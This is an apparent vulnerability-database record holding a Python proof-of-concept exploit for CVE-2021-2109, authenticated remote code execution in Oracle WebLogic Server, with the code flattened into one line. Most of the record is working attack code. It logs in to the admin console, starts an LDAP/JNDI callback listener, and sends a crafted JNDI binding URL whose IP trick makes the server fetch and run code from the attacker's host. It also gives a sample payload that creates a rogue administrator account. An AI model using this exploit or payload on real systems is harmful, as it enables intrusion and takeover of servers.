{
    "text": "vul_name : Oracle WebLogic Server 14.1.1.0 Remote Code Execution ， vul_cve : CVE-2021-2109 ， vul_poc :  # Exploit Title : Oracle WebLogic Server 14.1.1.0 - RCE ( Authenticated )  ，  # Date : 2021-01-21 ，  # Exploit Author : Photubias ，  # Vendor Advisory :  [ 1 ]  ，  # Vendor Homepage :  ，  # Version : WebLogic 10.3.6.0 , 12.1.3.0 , 12.2.1.3 , 12.2.1.4 , 14.1.1.0 ( fixed in JDKs 6u201 , 7u191 , 8u182 & 11.0.1 )  ，  # Tested on : WebLogic 14.1.1.0 with JDK-8u181 on Windows 10 20H2 ，  # CVE : CVE-2021-2109 ，  #  ! /usr/bin/env python3 ， ' ， Copyright 2021 Photubias ( c )  ， This program is free software : you can redistribute it and/or modify ， it under the terms of the GNU General Public License as published by ， the Free Software Foundation , either version 3 of the License , or ，  ( at your option ) any later version. ， This program is distributed in the hope that it will be useful ,  ， but WITHOUT ANY WARRANTY ; without even the implied warranty of ， MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the ， GNU General Public License for more details. ， You should have received a copy of the GNU General Public License ， along with this program. If not , see < ， File name CVE-2021-2109.py ， written by tijl [ dot ] deneut [ at ] howest [ dot ] be for www.ic4.be ， This is a native implementation without requirements , written in Python 3. ， Works equally well on Windows as Linux ( as MacOS , probably ; - )  ， Requires JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar ， from ， to be in the same folder ， ' ， Static vars ; change at will , but recommend leaving as is ， sURL = ' ， iTimeout = 5 ， oRun = None ， Ignore unsigned certs , if any because WebLogic is default HTTP ， ssl._create_default_https_context = ssl._create_unverified_context ， class runJar ( threading.Thread )  :  ， self.stdout = [  ]  ， self.stderr = ' ， self.cmd = sCMD ， self.addr = sAddress ， self.jarfile = sJarFile ， self.proc = None ， threading.Thread._init_ ( self )  ， self.proc = subprocess.Popen (  [ 'java' , '-jar' , self.jarfile , '-C' , self.cmd , '-A' , self.addr ]  , shell=False , stdout = subprocess.PIPE , stderr = subprocess.PIPE , universal_newlines=True )  ， sCurDir = os.getcwd (  )  ， sFile = ' ， sFile = file ， print ( ' [ + ] Found and using ' + sFile )  ， oProc = subprocess.Popen ( 'java -version' , stdout = subprocess.PIPE , stderr = subprocess.STDOUT )  ， exit ( ' [ - ] Error : java not found , needed to run the JAR file\\n Please make sure to have \"java\" in your path.' )  ， sResult = list ( oProc.stdout )  [ 0 ] .decode (  )  ， sHost = input ( ' [ ? ] Please enter the URL [ '+sURL+' ]  : ' )  ， sUser = input ( ' [ ? ] Username [ weblogic ]  : ' )  ， sPass = input ( ' [ ? ] Password [ Passw0rd- ]  : ' )  ， sCMD = input ( ' [ ? ] Command to run [ calc ]  : ' )  ， sLHOST = input ( ' [ ? ] Local IP to connect back to [ 192.168.0.10 ]  : ' )  ， global oRun ， oRun = runJar ( sJarFile , sCMD , sAddress )  ， oRun.start (  )  ， print ( ' [  !  ] Starting listener thread and waiting 3 seconds to retrieve the endpoint' )  ， oRun.join ( 3 )  ， exit ( ' [ - ] Error starting Java listener : \\n' + oRun.stderr )  ， bThisLine=False ， global oRun ， print ( ' [ + ] Closing threads' )  ， exit ( 0 )  ， usage = (  ， 'usage : %prog [ options ] URL \\n' ， ' Make sure to have \"JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\"\\n' ， ' in the current working folder\\n' ， 'Get it here :  ， 'Only works when hacker is reachable via an IPv4 address\\n' ， 'Use \"whoami\" to just verify the vulnerability ( OPSEC safe but no output ) \\n' ， 'Example : CVE-2021-2109.py -u weblogic -p Passw0rd -c calc -l 192.168.0.10 ， 'Sample payload as admin : cmd /c net user pwned Passw0rd- /add & net localgroup administrators pwned /add' ， parser = optparse.OptionParser ( usage=usage )  ， parser.add_option ( '-username' , '-u' , dest='username' )  ， parser.add_option ( '-password' , '-p' , dest='password' )  ， parser.add_option ( '-command' , '-c' , dest='command' )  ， parser.add_option ( '-listen' , '-l' , dest='listenaddr' )  ， parser.add_option ( '-verbose' , '-v' , dest='verbose' , action=\"store_true\" , default=False )  ， Get or ask for the vars ，  ( options , args ) = parser.parse_args (  )  ，  ( sHost , sUser , sPass , sCMD , sLHOST , bVerbose ) = checkParams ( options , args )  ， Verify Java and JAR file ， sJarFile = findJNDI (  )  ， findJAVA ( bVerbose )  ， Keep track of cookies between requests ， cj = http.cookiejar.CookieJar (  )  ， oOpener = urllib.request.build_opener ( urllib.request.HTTPCookieProcessor ( cj )  ， print ( ' [ + ] Verifying reachability' )  ， Get the cookie ， oRequest = urllib.request.Request ( url = sHost + '/console/' )  ， oResponse = oOpener.open ( oRequest , timeout = iTimeout )  ， Logging in ， lData = {'j_username' : sUser , 'j_password' : sPass , 'j_character_encoding' : 'UTF-8'} ， lHeaders = {'Referer' : sHost + '/console/login/LoginForm.jsp'} ， oRequest = urllib.request.Request ( url = sHost + '/console/j_security_check' , data = urllib.parse.urlencode ( lData ) .encode (  )  , headers = lHeaders )  ， oResponse = oOpener.open ( oRequest , timeout = iTimeout )  ， sResult = oResponse.read (  ) .decode ( errors='ignore' ) .split ( '\\r\\n' )  ， bSuccess = True ， Launch the LDAP listener and retrieve the random endpoint value ， sRandom = startListener ( sJarFile , sCMD , sLHOST , bVerbose )  ， This is the actual vulnerability , retrieve LDAP data from victim which the runs on victim , it bypasses verification because IP is written as \"127.0.0 ; 1\" instead of \"127.0.0.1\" ， print ( '\\n [ + ] Firing exploit now , hold on' )  ， sConvertedIP = sLHOST.split ( '.' )  [ 0 ] + '.' + sLHOST.split ( '.' )  [ 1 ] + '.' + sLHOST.split ( '.' )  [ 2 ] + ' ; ' + sLHOST.split ( '.' )  [ 3 ]  ， sFullUrl = sHost + r'/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle ( %22ldap : /' + sConvertedIP + ' : 1389/' + sRandom + r' ; AdminServer%22 ) ' ， oRequest = urllib.request.Request ( url = sFullUrl , headers = lHeaders )  ， oResponse = oOpener.open ( oRequest , timeout = iTimeout )  ， time.sleep ( 5 )  ， bExploitWorked = False ， endIt (  ) ",
    "time": "2021.01.23"
}